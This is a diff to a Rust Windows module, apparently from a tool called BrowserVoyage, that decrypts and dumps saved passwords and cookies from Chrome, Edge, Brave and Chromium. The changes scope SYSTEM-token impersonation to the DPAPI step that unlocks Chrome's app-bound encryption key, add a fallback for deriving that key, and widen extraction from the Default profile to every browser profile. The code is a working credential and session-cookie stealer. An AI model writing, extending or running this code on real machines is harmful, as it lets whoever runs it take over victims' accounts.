@@ -19,12 +19,25 @@ use sha2::{Digest, Sha256};
 use std::env;
 use std::fs;
 use std::path::{Path, PathBuf};
-use tracing::{debug, info, instrument};
-use windows::core::w;
+use tracing::{debug, info, instrument, warn};
+use windows::core::{w, PWSTR};
 use windows::Win32::Security::Cryptography::{
     CryptUnprotectData, NCryptDecrypt, NCryptFreeObject, NCryptOpenKey, NCryptOpenStorageProvider,
     CERT_KEY_SPEC, CRYPT_INTEGER_BLOB, NCRYPT_FLAGS, NCRYPT_KEY_HANDLE, NCRYPT_PROV_HANDLE,
 };
+use windows::Win32::System::WindowsProgramming::GetUserNameW;
+
+fn get_current_user() -> String {
+    let mut buffer = [0u16; 257];
+    let mut size = buffer.len() as u32;
+    unsafe {
+        if GetUserNameW(Some(PWSTR(buffer.as_mut_ptr())), &mut size).is_ok() {
+            String::from_utf16_lossy(&buffer[..size as usize - 1])
+        } else {
+            "Unknown".to_string()
+        }
+    }
+}
 
 /// Optimized Windows Chrome extractor with extraction-level impersonation
 #[derive(Debug)]
@@ -71,6 +84,11 @@ impl WindowsChromeExtractor {
         Self::new(ChromeBrowserConfig::brave())
     }
 
+    /// Create a new Chromium extractor
+    pub fn chromium() -> Self {
+        Self::new(ChromeBrowserConfig::chromium())
+    }
+
     /// Create a new extractor with custom config
     fn new(config: ChromeBrowserConfig) -> Self {
         let user_data_path = Self::get_user_data_path_for_config(&config)
@@ -113,22 +131,9 @@ impl WindowsChromeExtractor {
             self.config.name
         );
 
-        // Start impersonation for the entire key derivation process
-        let _impersonation_guard = ImpersonationGuard::new()?;
-        debug!(
-            "Impersonation started for {} key derivation",
-            self.config.name
-        );
-
-        // Get the master key with impersonation active
+        // Let inner routines manage impersonation only where required (e.g., SYSTEM DPAPI decrypt)
         let master_key = self.extract_master_key_with_active_impersonation()?;
         self.cached_master_key = Some(master_key);
-
-        debug!(
-            "Master key cached for {}, impersonation will be dropped",
-            self.config.name
-        );
-        // Impersonation guard will be dropped here, ending impersonation
 
         Ok(())
     }
@@ -170,15 +175,36 @@ impl WindowsChromeExtractor {
         }
 
         let key_blob_encrypted = &key_blob_encrypted_with_prefix[4..];
-
+        // Perform first decrypt under SYSTEM impersonation, then drop it for user decrypt
         info!("Decrypting with SYSTEM DPAPI");
-        let key_blob_system_decrypted = self.dpapi_unprotect(key_blob_encrypted)?;
+        let key_blob_system_decrypted = {
+            let _guard = ImpersonationGuard::new()?;
+            let result = self.dpapi_unprotect(key_blob_encrypted)?;
+            // Drop guard to revert to the original user before the second DPAPI call
+            drop(_guard);
+            result
+        };
 
         info!("Decrypting with user DPAPI");
         let key_blob_user_decrypted = self.dpapi_unprotect(&key_blob_system_decrypted)?;
 
-        let parsed_data = self.parse_key_blob(&key_blob_user_decrypted)?;
-        self.derive_v20_master_key(&parsed_data)
+        let parsed_data = self.parse_key_blob(&key_blob_user_decrypted);
+        match parsed_data.and_then(|pd| self.derive_v20_master_key(&pd)) {
+            Ok(master_key) => Ok(master_key),
+            Err(e) => {
+                debug!(
+                    "Chrome key derivation failed ({}). Falling back to last-32-bytes method",
+                    e
+                );
+                if key_blob_user_decrypted.len() >= 32 {
+                    let state_key =
+                        key_blob_user_decrypted[key_blob_user_decrypted.len() - 32..].to_vec();
+                    Ok(state_key)
+                } else {
+                    Err(e)
+                }
+            }
+        }
     }
 
     fn extract_simple_master_key(&self, os_crypt: &OsCrypt) -> BrowserVoyageResult<Vec<u8>> {
@@ -436,6 +462,11 @@ impl WindowsChromeExtractor {
 
     /// DPAPI decrypt
     fn dpapi_unprotect(&self, data: &[u8]) -> BrowserVoyageResult<Vec<u8>> {
+        info!(
+            "Decrypting {} bytes with DPAPI for user: {}",
+            data.len(),
+            get_current_user()
+        );
         unsafe {
             let data_in = CRYPT_INTEGER_BLOB {
                 cbData: data.len() as u32,
@@ -679,8 +710,13 @@ impl WindowsChromeExtractor {
         }
     }
 
-    fn extract_cookies(&self, master_key: &[u8]) -> BrowserVoyageResult<Vec<Cookie>> {
-        let cookie_db_path = self.user_data_path.join("Default/Network/Cookies");
+    #[instrument(skip(profile_path))]
+    fn extract_cookies(
+        &self,
+        master_key: &[u8],
+        profile_path: &Path,
+    ) -> BrowserVoyageResult<Vec<Cookie>> {
+        let cookie_db_path = profile_path.join("Network/Cookies");
 
         info!("Connecting to {} cookie database", self.config.name);
         let conn = Connection::open_with_flags(
@@ -777,8 +813,13 @@ impl WindowsChromeExtractor {
         Ok(extracted_cookies)
     }
 
-    fn extract_credentials(&self, master_key: &[u8]) -> BrowserVoyageResult<Vec<Credential>> {
-        let login_db_path = self.user_data_path.join("Default/Login Data");
+    #[instrument(skip(master_key, profile_path))]
+    fn extract_credentials(
+        &self,
+        master_key: &[u8],
+        profile_path: &Path,
+    ) -> BrowserVoyageResult<Vec<Credential>> {
+        let login_db_path = profile_path.join("Login Data");
 
         if !login_db_path.exists() {
             debug!("Login Data database not found at: {:?}", login_db_path);
@@ -788,9 +829,14 @@ impl WindowsChromeExtractor {
         info!("Connecting to {} Login Data database", self.config.name);
 
         // Try to copy the database file if it's locked
+        let profile_name = profile_path
+            .file_name()
+            .unwrap_or_default()
+            .to_string_lossy();
         let temp_path = std::env::temp_dir().join(format!(
-            "{}_login_data_temp.db",
-            self.config.name.to_lowercase()
+            "{}_{}_login_data_temp.db",
+            self.config.name.to_lowercase(),
+            profile_name
         ));
         let db_path = if Connection::open_with_flags(
             &login_db_path,
@@ -865,6 +911,42 @@ impl WindowsChromeExtractor {
         Ok(extracted_credentials)
     }
 
+    /// Finds all browser profiles for this browser type
+    fn find_profiles(&self) -> BrowserVoyageResult<Vec<crate::common::BrowserProfile>> {
+        let user_data_path = &self.user_data_path;
+        let mut profiles = Vec::new();
+
+        // Check for Default profile first to preserve its priority
+        let default_path = user_data_path.join("Default");
+        if default_path.exists() {
+            profiles.push(crate::common::BrowserProfile::new(
+                "Default".to_string(),
+                default_path,
+                true,
+            ));
+        }
+
+        // Scan for other profile directories (e.g., "Profile 1", "Profile 2")
+        if let Ok(entries) = fs::read_dir(user_data_path) {
+            for entry in entries.flatten() {
+                let path = entry.path();
+                if path.is_dir() {
+                    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
+                        if name.starts_with("Profile ") {
+                            profiles.push(crate::common::BrowserProfile::new(
+                                name.to_string(),
+                                path,
+                                false,
+                            ));
+                        }
+                    }
+                }
+            }
+        }
+
+        Ok(profiles)
+    }
+
     fn decrypt_windows_chrome_data(&self, encrypted_data: &[u8]) -> BrowserVoyageResult<Vec<u8>> {
         if encrypted_data.len() < 3 {
             return Err(BrowserVoyageError::DecryptionFailed(
@@ -912,30 +994,50 @@ impl BrowserExtractor for WindowsChromeExtractor {
     }
 
     fn extract(&mut self) -> BrowserVoyageResult<ExtractedData> {
+        info!(
+            "User data path for {}: {:?}",
+            self.config.name, self.user_data_path
+        );
         self.initialize_master_key_with_impersonation()?;
         let master_key = self.get_master_key()?;
-        let cookies = self.extract_cookies(&master_key)?;
-        let credentials = self.extract_credentials(&master_key)?;
 
-        let profile_data = ProfileData {
-            name: "Default".to_string(),
-            path: self.user_data_path.join("Default").display().to_string(),
-            cookies,
-            credentials,
-        };
+        let profiles = self.find_profiles()?;
+        let mut all_profile_data = Vec::new();
+
+        if profiles.is_empty() {
+            warn!("No profiles found for {}", self.config.name);
+        }
+
+        for profile in profiles {
+            debug!("Extracting data from profile: {}", profile.name);
+            // Using unwrap_or_default to continue even if one db fails, e.g. profile is not in use
+            let cookies = self
+                .extract_cookies(&master_key, &profile.path)
+                .unwrap_or_default();
+            let credentials = self
+                .extract_credentials(&master_key, &profile.path)
+                .unwrap_or_default();
+
+            if cookies.is_empty() && credentials.is_empty() {
+                debug!("No data extracted from profile: {}", profile.name);
+                continue;
+            }
+
+            all_profile_data.push(ProfileData {
+                name: profile.name,
+                path: profile.path.display().to_string(),
+                cookies,
+                credentials,
+            });
+        }
 
         Ok(ExtractedData {
             browser: BrowserInfo {
                 name: self.config.name.clone(),
-                vendor: match self.config.name.as_str() {
-                    "Chrome" => "Google".to_string(),
-                    "Edge" => "Microsoft".to_string(),
-                    "Brave" => "Brave Software".to_string(),
-                    _ => "Unknown".to_string(),
-                },
+                vendor: self.config.vendor.clone(),
                 platform: "Windows".to_string(),
             },
-            profiles: vec![profile_data],
+            profiles: all_profile_data,
         })
     }
 }
